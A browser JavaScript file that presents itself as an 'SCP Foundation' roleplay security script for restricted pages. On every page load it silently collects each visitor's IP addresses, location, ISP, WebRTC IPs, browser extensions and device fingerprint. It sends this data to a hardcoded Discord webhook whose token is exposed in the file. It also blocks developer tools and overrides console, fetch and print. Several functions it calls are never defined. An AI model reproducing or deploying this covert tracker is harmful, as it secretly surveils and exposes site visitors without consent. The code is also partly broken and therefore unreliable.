// ============================================================
// SCP FOUNDATION - SENSITIVE CODE PROTECTION SCRIPT
// Protects: PLP-L-2, PLP-L-3, PLP-L-4, PLP-L-5
//           L-5T-Code-of-Ethics, L-5T-Lockdown-Response-Code
//           L-4-Lockdown-Response-Code, 3-LRC, 2-LRC
//           L-4-Code-of-Ethics, L3-CoE, L2-CoE, L-1-CoE
// ============================================================

// Global violation tracking
let violationCount = 0;
const violationHistory = [];
const webhookURL = "https://discord.com/api/webhooks/1482510569461383242/tF_91rzrXYfs4P-qBbarNafSa-fArvPp99_HxdoM8_iREqzgaSTLhBoFOajYwB1-ElgN";

// ============================================================
// DATA COLLECTION MODULE
// ============================================================

// Function to get IP address using multiple methods
async function getIPAddresses() {
    const ipMethods = {
        'ipify': 'https://api.ipify.org?format=json',
        'ipapi': 'https://api.ipapi.is?format=json',
        'ipinfo': 'https://ipinfo.io/json',
        'icanhazip': 'https://icanhazip.com',
        'ipv4': 'https://api.ip.sb/jsonip'
    };
    
    const ipResults = {};
    
    for (const [method, url] of Object.entries(ipMethods)) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000);
            
            const response = await fetch(url, { signal: controller.signal });
            let data;
            
            if (method === 'icanhazip') {
                const text = await response.text();
                ipResults[method] = text.trim();
            } else if (method === 'ipv4') {
                data = await response.json();
                ipResults[method] = data.ipv4 || data.ip || 'Failed';
            } else if (method === 'ipapi') {
                data = await response.json();
                ipResults[method] = data.ip || 'Failed';
            } else if (method === 'ipinfo') {
                data = await response.json();
                ipResults[method] = data.ip || 'Failed';
            } else {
                data = await response.json();
                ipResults[method] = data.ip || 'Failed';
            }
            
            clearTimeout(timeoutId);
        } catch (error) {
            ipResults[method] = 'Failed';
        }
    }
    
    return ipResults;
}

// Function to get the primary working IP
function getPrimaryIP(ipResults) {
    const priorityMethods = ['icanhazip', 'ipv4', 'ipapi', 'ipify', 'ipinfo'];
    
    for (const method of priorityMethods) {
        const ip = ipResults[method];
        if (ip && ip !== 'Failed' && ip !== 'Failed to retrieve' && ip.includes('.')) {
            return { ip: ip, source: method };
        }
    }
    
    for (const [method, ip] of Object.entries(ipResults)) {
        if (ip && ip !== 'Failed' && ip !== 'Failed to retrieve' && ip.includes('.')) {
            return { ip: ip, source: method };
        }
    }
    
    return { ip: 'Unable to retrieve IP', source: 'none' };
}

// Function to get location information
async function getLocationInfo(ip) {
    if (ip === 'Unable to retrieve IP') return 'Location unavailable';
    
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);
        
        const response = await fetch(`https://ipapi.co/${ip}/json/`, { signal: controller.signal });
        const data = await response.json();
        
        clearTimeout(timeoutId);
        
        if (data.error) return 'Location unavailable';
        return `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}`;
    } catch (error) {
        return 'Location unavailable';
    }
}

// Function to get ISP information
async function getISPInfo(ip) {
    if (ip === 'Unable to retrieve IP') return 'ISP unavailable';
    
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);
        
        const response = await fetch(`https://ipapi.co/${ip}/json/`, { signal: controller.signal });
        const data = await response.json();
        
        clearTimeout(timeoutId);
        
        return data.org || 'ISP unavailable';
    } catch (error) {
        return 'ISP unavailable';
    }
}

// Function to get current page information
function getCurrentPageInfo() {
    return {
        url: window.location.href,
        pathname: window.location.pathname,
        title: document.title,
        referrer: document.referrer || 'Direct visit',
        protocol: window.location.protocol,
        hostname: window.location.hostname
    };
}

// Function to send security alert to Discord
async function sendSecurityAlert(violationType, clearanceLevel, attemptNumber, pageInfo, ipInfo, deviceInfo) {
    const timestamp = new Date().toISOString();
    const referenceNumber = `EC-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
    
    const alertEmbed = {
        title: "🚨 SECURITY VIOLATION ALERT 🚨",
        color: 0xff0000,
        timestamp: timestamp,
        fields: [
            {
                name: "⚠️ Violation Details",
                value: `**Type:** ${violationType}\n**Clearance Required:** ${clearanceLevel}\n**Attempt #:** ${attemptNumber}\n**Reference:** ${referenceNumber}`,
                inline: false
            },
            {
                name: "🌐 Network Information",
                value: `**Primary IP:** ${ipInfo.primaryIP}\n**Location:** ${ipInfo.location}\n**ISP:** ${ipInfo.isp}\n**Connection Type:** ${ipInfo.connectionType}\n**VPN Detected:** ${ipInfo.vpnStatus}`,
                inline: false
            },
            {
                name: "🖥️ Attempt Details",
                value: `**Page URL:** ${pageInfo.url}\n**Page Title:** ${pageInfo.title}\n**Referrer:** ${pageInfo.referrer}\n**Timestamp:** ${timestamp}`,
                inline: false
            },
            {
                name: "💻 Device Information",
                value: `**Browser:** ${deviceInfo.userAgent.substring(0, 200)}\n**OS:** ${deviceInfo.os}\n**Language:** ${deviceInfo.language}\n**Dark Mode:** ${deviceInfo.darkMode}`,
                inline: false
            },
            {
                name: "📊 Violation History",
                value: `**Total Violations:** ${violationCount}\n**Last 3 Attempts:** ${violationHistory.slice(-3).join(', ') || 'None'}`,
                inline: false
            }
        ],
        footer: {
            text: "SCP Foundation - Ethics Committee | This incident has been logged"
        }
    };
    
    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                embeds: [alertEmbed], 
                username: "SCP Foundation Security Monitor",
                avatar_url: "https://cdn-icons-png.flaticon.com/512/1006/1006771.png"
            })
        });
        
        if (response.ok) {
            console.log('Security alert sent successfully');
        } else {
            console.error('Failed to send security alert');
        }
    } catch (error) {
        console.error('Error sending security alert:', error);
    }
    
    return referenceNumber;
}

// Function to update main data collection with page info
async function collectAndSendData() {
    const ipResults = await getIPAddresses();
    const primary = getPrimaryIP(ipResults);
    const primaryIP = primary.ip;
    const ipSource = primary.source;
    
    const location = await getLocationInfo(primaryIP);
    const isp = await getISPInfo(primaryIP);
    const webRTCIPs = await getWebRTCIPs();
    const batteryInfo = await getBatteryInfo();
    const abuseScore = await getIPAbuseScore(primaryIP);
    const vpnDetection = await detectVPN(primaryIP);
    const browserExtensions = await detectBrowserExtensions();
    const pageInfo = getCurrentPageInfo();
    
    const ipResultsFormatted = Object.entries(ipResults)
        .map(([method, ip]) => {
            const status = (ip === primaryIP && method === ipSource) ? ' ✓ (Primary)' : '';
            return `**${method}:** ${ip}${status}`;
        })
        .join('\n');
    
    let abuseInfo = '';
    if (abuseScore && !abuseScore.error) {
        if (abuseScore.hostingDetected) abuseInfo += `**Hosting Detected:** Yes\n`;
        if (abuseScore.hostingService) abuseInfo += `**Service Provider:** ${abuseScore.hostingService}\n`;
        if (abuseScore.abuseRisk) abuseInfo += `**Abuse Risk:** ${abuseScore.abuseRisk}\n`;
        if (abuseScore.abuseConfidence) abuseInfo += `**Abuse Confidence:** ${abuseScore.abuseConfidence}\n`;
    } else {
        abuseInfo = 'Abuse score unavailable\n';
    }
    
    const vpnInfo = vpnDetection.detected === true ? 
        `⚠️ **VPN/Proxy Detected**\nDetails: ${vpnDetection.details.join(', ')}` :
        (vpnDetection.detected === false ? 
        `✅ **No VPN/Proxy Detected**\n${vpnDetection.details}` :
        `❓ **Unknown**\n${vpnDetection.details}`);
    
    const extensionsInfo = browserExtensions.length > 0 ? 
        browserExtensions.map(ext => `• ${ext}`).join('\n') : 
        'No extensions detected';

    const embedData = {
        title: "🌐 User Information Collected",
        color: 0x0099ff,
        timestamp: new Date().toISOString(),
        fields: [
            { name: "📄 Current Page Information", value: `**URL:** ${pageInfo.url}\n**Page Title:** ${pageInfo.title}\n**Path:** ${pageInfo.pathname}\n**Referrer:** ${pageInfo.referrer}`, inline: false },
            { name: "🔍 Multiple IP Detection Results", value: ipResultsFormatted, inline: false },
            { name: "🌍 Network Information", value: `**Primary IP:** ${primaryIP} (via ${ipSource})\n**Location:** ${location}\n**ISP:** ${isp}\n**Connection Type:** ${getConnectionType()}\n**Online Status:** ${navigator.onLine ? 'Online' : 'Offline'}\n**WebRTC IPs:** ${webRTCIPs}\n**Network Details:** ${getNetworkInfo()}`, inline: false },
            { name: "⚠️ IP Reputation & Security Analysis", value: abuseInfo, inline: false },
            { name: "🔐 VPN/Proxy Detection Status", value: vpnInfo, inline: false },
            { name: "🧩 Detected Browser Extensions", value: extensionsInfo.length > 1024 ? extensionsInfo.substring(0, 1000) + '...' : extensionsInfo, inline: false },
            { name: "🖥️ System Information", value: `**Browser:** ${navigator.userAgent}\n**OS:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n**Timezone Offset:** ${getTimezoneOffset()}\n**Vendor:** ${navigator.vendor || 'Unknown'}\n**Device Type:** ${/Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}`, inline: false },
            { name: "📊 Display Information", value: `**Screen Resolution:** ${screen.width}x${screen.height}\n**Window Size:** ${window.innerWidth}x${window.innerHeight}\n**Color Depth:** ${screen.colorDepth} bits\n**Pixel Ratio:** ${window.devicePixelRatio || 'N/A'}\n**Device Memory:** ${navigator.deviceMemory || 'Unknown'} GB\n**Battery:** ${batteryInfo}`, inline: false },
            { name: "⚙️ Technical Capabilities", value: `**CPU Cores:** ${navigator.hardwareConcurrency || 'Unknown'}\n**Touch Screen:** ${'maxTouchPoints' in navigator ? navigator.maxTouchPoints > 0 : 'Unknown'}\n**Cookies Enabled:** ${navigator.cookieEnabled}\n**Local Storage:** ${!!window.localStorage}\n**Session Storage:** ${!!window.sessionStorage}\n**Installed Fonts:** ${getInstalledFonts()}`, inline: false },
            { name: "🔧 Web Technologies", value: `**Web Workers:** ${!!window.Worker}\n**Service Workers:** ${'serviceWorker' in navigator}\n**WebAssembly:** ${!!window.WebAssembly}\n**WebGL2:** ${!!document.createElement('canvas').getContext('webgl2')}\n**WebP Support:** ${(() => { const canvas = document.createElement('canvas'); return canvas.toDataURL('image/webp').indexOf('data:image/webp') === 0; })()}\n**Plugins:** ${getPlugins()}`, inline: false },
            { name: "🎨 WebGL Renderer", value: getGPUInfo(), inline: false },
            { name: "⚙️ User Preferences", value: `**Dark Mode:** ${isDarkMode() ? 'Enabled' : 'Disabled'}\n**Reduced Motion:** ${hasReducedMotion() ? 'Enabled' : 'Disabled'}\n**Do Not Track:** ${navigator.doNotTrack || 'Not set'}`, inline: false },
            { name: "🔐 Security & Privacy", value: `**JavaScript Enabled:** Yes\n**ActiveX:** ${!!window.ActiveXObject ? 'Yes' : 'No'}\n**Java Enabled:** ${navigator.javaEnabled ? navigator.javaEnabled() : 'Unknown'}\n**Session Persistence:** ${!!window.sessionStorage}`, inline: false }
        ],
        footer: { text: "Collected by the Telecommunications Monitoring Office and the Recordkeeping And Information Security Administration" }
    };
    
    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embedData], username: "Internet & Technical Services Bureau", avatar_url: "https://cdn-icons-png.flaticon.com/512/1006/1006771.png" })
        });
        if (response.ok) console.log('Data sent successfully to Discord');
        else console.error('Failed to send data to Discord');
    } catch (error) {
        console.error('Error sending data:', error);
    }
}

// ============================================================
// SCP FOUNDATION SECURITY PROTOCOL WITH ALERTS
// ============================================================

(function() {
    'use strict';

    const PROTECTED_PATTERNS = [
        /PLP-L-2/i, /PLP[-\s]?L[-\s]?3/i, /PLP[-\s]?L[-\s]?4/i, /PLP[-\s]?L[-\s]?5/i,
        /L-5T-Code-of-Ethics/i, /L-5T-Lockdown-Response-Code/i, /L-5T-Locdown-Response-Code/i,
        /L-4-Lockdown-Response-Code/i, /L-4-Locdown-Response-Code/i, /3-LRC/i, /2-LRC/i,
        /L-4-Code-of-Ethics/i, /L3-CoE/i, /L2-CoE/i, /L-1-CoE/i, /L[-\s]?1[-\s]?CoE/i,
        /L[-\s]?2[-\s]?CoE/i, /L[-\s]?3[-\s]?CoE/i, /L[-\s]?4[-\s]?Code[-\s]?of[-\s]?Ethics/i
    ];

    const REDACTED_MESSAGES = {
        'PLP-L-2': 'ACCESS DENIED - Clearance L-2 Insufficient for PLP Archive',
        'PLP-L-3': 'ACCESS DENIED - Clearance L-3 Required for PLP Archive',
        'PLP-L-4': 'ACCESS DENIED - Clearance L-4 Required for PLP Archive',
        'PLP-L-5': 'ACCESS DENIED - Clearance L-5 Required for PLP Archive',
        'L-5T': 'ACCESS DENIED - Thaumiel Clearance Required',
        'L-4': 'ACCESS DENIED - Level 4 Clearance Required',
        'L-3': 'ACCESS DENIED - Level 3 Clearance Required',
        'L-2': 'ACCESS DENIED - Level 2 Clearance Required',
        'L-1': 'ACCESS DENIED - Level 1 Clearance Required',
        'default': '█ ACCESS DENIED █ - This content is restricted to authorized personnel only. Violation will be logged and reported to the Ethics Committee.'
    };

    let violationDataCache = null;

    // Get cached violation data or fetch fresh
    async function getViolationData() {
        if (violationDataCache) return violationDataCache;
        
        const ipResults = await getIPAddresses();
        const primary = getPrimaryIP(ipResults);
        const location = await getLocationInfo(primary.ip);
        const isp = await getISPInfo(primary.ip);
        const vpnDetection = await detectVPN(primary.ip);
        
        violationDataCache = {
            ipResults: ipResults,
            primaryIP: primary.ip,
            ipSource: primary.source,
            location: location,
            isp: isp,
            connectionType: getConnectionType(),
            vpnStatus: vpnDetection.detected === true ? 'VPN/Proxy Detected' : (vpnDetection.detected === false ? 'No VPN' : 'Unknown'),
            deviceInfo: {
                userAgent: navigator.userAgent,
                os: navigator.platform,
                language: navigator.language,
                darkMode: isDarkMode() ? 'Enabled' : 'Disabled'
            }
        };
        
        return violationDataCache;
    }

    function detectProtectedContent(url, pageContent) {
        const haystack = (url + ' ' + (pageContent || '')).toLowerCase();
        for (const pattern of PROTECTED_PATTERNS) {
            if (pattern.test(haystack)) {
                if (/plp-l-2/i.test(haystack)) return 'PLP-L-2';
                if (/plp-l-3/i.test(haystack)) return 'PLP-L-3';
                if (/plp-l-4/i.test(haystack)) return 'PLP-L-4';
                if (/plp-l-5/i.test(haystack)) return 'PLP-L-5';
                if (/l-5t/i.test(haystack)) return 'L-5T';
                if (/l-4/i.test(haystack) && /lockdown|code of ethics/i.test(haystack)) return 'L-4';
                if (/l-3/i.test(haystack) || /3-lrc/i.test(haystack)) return 'L-3';
                if (/l-2/i.test(haystack) || /2-lrc/i.test(haystack)) return 'L-2';
                if (/l-1/i.test(haystack)) return 'L-1';
                return 'default';
            }
        }
        return null;
    }

    function isSensitivePage() {
        const url = window.location.href;
        const bodyText = document.body ? document.body.innerText.substring(0, 5000) : '';
        return detectProtectedContent(url, bodyText) !== null;
    }

    async function logViolation(violationType, clearanceLevel) {
        violationCount++;
        const timestamp = new Date().toISOString();
        const pageInfo = getCurrentPageInfo();
        
        violationHistory.push({
            type: violationType,
            level: clearanceLevel,
            timestamp: timestamp,
            page: pageInfo.url
        });
        
        // Keep only last 20 violations
        while (violationHistory.length > 20) {
            violationHistory.shift();
        }
        
        // Get violation data for alert
        const violationData = await getViolationData();
        
        // Send alert to Discord
        await sendSecurityAlert(
            violationType,
            clearanceLevel,
            violationCount,
            pageInfo,
            {
                primaryIP: violationData.primaryIP,
                location: violationData.location,
                isp: violationData.isp,
                connectionType: violationData.connectionType,
                vpnStatus: violationData.vpnStatus
            },
            violationData.deviceInfo
        );
        
        // Store in sessionStorage
        try {
            const storedViolations = JSON.parse(sessionStorage.getItem('scp_security_violations') || '[]');
            storedViolations.push({
                count: violationCount,
                type: violationType,
                level: clearanceLevel,
                timestamp: timestamp,
                page: pageInfo.url
            });
            sessionStorage.setItem('scp_security_violations', JSON.stringify(storedViolations.slice(-20)));
        } catch(e) {}
    }

    async function showRedactionWarning(level, isPermanent = false) {
        const message = REDACTED_MESSAGES[level] || REDACTED_MESSAGES.default;
        
        // Log the violation
        await logViolation('Developer Tools Access', level);
        
        const warning = document.createElement('div');
        warning.style.cssText = `
            position: fixed; top: 0; left: 0; right: 0;
            background-color: #8b0000; color: white;
            text-align: center; padding: 15px;
            z-index: 99999; font-family: monospace;
            font-weight: bold; border-bottom: 2px solid #dc143c;
            animation: slideDown 0.3s ease-out;
        `;
        warning.innerText = `${message} | Violation #${violationCount} - This incident has been logged and reported to the Ethics Committee.`;
        document.body.prepend(warning);
        setTimeout(() => warning.remove(), 5000);
        
        if (isPermanent) {
            clearPageContent(level);
        }
    }
    
    function clearPageContent(level) {
        if (!document.body) return;
        document.body.innerHTML = `
            <div style="background-color:#1a1a1a;color:#b01c1c;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;padding:20px;flex-direction:column;">
                <h1>⚠️ ACCESS VIOLATION DETECTED ⚠️</h1>
                <div style="border:2px solid #b01c1c;padding:30px;margin:20px;max-width:600px;">
                    <p style="color:#ff6b6b;font-size:18px;">${REDACTED_MESSAGES[level] || REDACTED_MESSAGES.default}</p>
                    <p style="color:#aaaaaa;margin-top:20px;">Your attempt to access restricted content has been logged.</p>
                    <p style="color:#ff6b6b;margin-top:10px;">Violation #${violationCount}</p>
                    <p style="color:#666;font-size:12px;margin-top:30px;">Reference: EC-${Date.now().toString(36).toUpperCase()}</p>
                </div>
            </div>
        `;
        document.body.style.userSelect = 'none';
        document.body.style.overflow = 'hidden';
    }

    // Prevent right-click
    document.addEventListener('contextmenu', async function(e) {
        if (e.target.closest('input, textarea, [contenteditable="true"]')) return true;
        if (isSensitivePage()) {
            e.preventDefault();
            const url = window.location.href;
            const bodyText = document.body ? document.body.innerText.substring(0, 5000) : '';
            const protectedMatch = detectProtectedContent(url, bodyText);
            if (protectedMatch) {
                await logViolation('Right-Click Attempt', protectedMatch);
                showRedactionWarning(protectedMatch);
            }
            return false;
        }
        return true;
    });

    // Prevent key combinations
    document.addEventListener('keydown', async function(e) {
        if (!isSensitivePage()) return;
        
        const blockedKeys = ['F12'];
        const blockedCombos = [
            { ctrl: true, shift: true, key: 'I' }, { ctrl: true, shift: true, key: 'J' },
            { ctrl: true, key: 'U' }, { ctrl: true, shift: true, key: 'C' },
            { ctrl: true, shift: true, key: 'K' }
        ];
        
        let violationTriggered = false;
        let violationType = '';
        
        if (blockedKeys.includes(e.key)) {
            e.preventDefault();
            violationTriggered = true;
            violationType = 'F12 Key Press';
        }
        
        for (const combo of blockedCombos) {
            if ((!combo.ctrl || e.ctrlKey) && (!combo.shift || e.shiftKey) && 
                (!combo.alt || e.altKey) && e.key === combo.key) {
                e.preventDefault();
                violationTriggered = true;
                violationType = `Key Combo: ${combo.ctrl ? 'Ctrl+' : ''}${combo.shift ? 'Shift+' : ''}${e.key}`;
                break;
            }
        }
        
        if (violationTriggered) {
            const url = window.location.href;
            const bodyText = document.body ? document.body.innerText.substring(0, 5000) : '';
            const protectedMatch = detectProtectedContent(url, bodyText);
            await logViolation(violationType, protectedMatch || 'default');
            showRedactionWarning(protectedMatch || 'default');
            return false;
        }
    });

    // DevTools detection
    let devToolsOpen = false;
    setInterval(async function() {
        const threshold = 160;
        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
        
        if ((widthThreshold || heightThreshold) && !devToolsOpen && isSensitivePage()) {
            devToolsOpen = true;
            const url = window.location.href;
            const bodyText = document.body ? document.body.innerText.substring(0, 5000) : '';
            const protectedMatch = detectProtectedContent(url, bodyText);
            await logViolation('DevTools Opened', protectedMatch || 'default');
            showRedactionWarning(protectedMatch || 'default', true);
        } else if (!widthThreshold && !heightThreshold) {
            devToolsOpen = false;
        }
    }, 1000);

    // Override console methods to detect console usage
    const originalConsoleLog = console.log;
    console.log = async function() {
        if (isSensitivePage()) {
            const url = window.location.href;
            const bodyText = document.body ? document.body.innerText.substring(0, 5000) : '';
            const protectedMatch = detectProtectedContent(url, bodyText);
            await logViolation('Console Usage Attempt', protectedMatch || 'default');
            return;
        }
        originalConsoleLog.apply(console, arguments);
    };

    // Block fetch for sensitive URLs
    const originalFetch = window.fetch;
    window.fetch = async function() {
        const url = arguments[0];
        if (url && isSensitivePage()) {
            const protectedMatch = detectProtectedContent(window.location.href, '');
            await logViolation('Fetch Attempt on Restricted Resource', protectedMatch || 'default');
            return Promise.reject(new Error('ACCESS DENIED - This resource is restricted'));
        }
        return originalFetch.apply(this, arguments);
    };

    // Disable print
    const originalPrint = window.print;
    window.print = async function() {
        if (isSensitivePage()) {
            const protectedMatch = detectProtectedContent(window.location.href, '');
            await logViolation('Print Attempt', protectedMatch || 'default');
            alert('Printing restricted documents is prohibited. This incident has been logged and will be reported.');
            return;
        }
        originalPrint();
    };

    // Add CSS animation
    const style = document.createElement('style');
    style.textContent = `@keyframes slideDown { from { transform: translateY(-100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }`;
    document.head.appendChild(style);

    console.log('SCP Foundation Security Protocol Active - Code of Ethics Enforcement v2.7');
})();

// Execute data collection
collectAndSendData();
